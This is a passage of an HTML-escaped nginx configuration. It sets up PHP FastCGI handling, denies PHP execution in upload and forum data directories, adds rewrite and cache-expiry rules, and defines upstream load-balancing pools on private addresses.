/&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;location ~ .*/(attachments|customavatars|error|images|ipdata|mspace|plugins|templates|forumdata|include)/.*\\.php$ {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; deny all;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; location /camera.php&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;fastcgi_pass&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;127.0.0.1:9000;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;include fcgi.conf;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;location ~ .*\\.(php|php5)?$&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;#fastcgi_pass&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;127.0.0.1:9000;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;fastcgi_pass&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cluster;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;#root&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/mnt/htdocs/www/public;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;fastcgi_index index.php;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;include fcgi.conf;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; location / {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;index&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;index.php;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;#root&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/mnt/htdocs/www/public;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;#fastcgi_pass&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cluster;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if (!-f $request_filename){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;rewrite ^/(.+)$ /index.php?$1&amp;amp; last;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; expires&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;30d;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;location ~ .*\\.(js|css)?$&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;expires&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;1h;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;upstream&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;www.cncms.com.cn&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 192.168.1.2:80;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 192.168.1.3:80;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 192.168.1.4:80;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 192.168.1.5:80;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;upstream&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;bbs.cncms.com.cn&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 192.168.1.7:8080;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 192.168.1.7:8081;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br 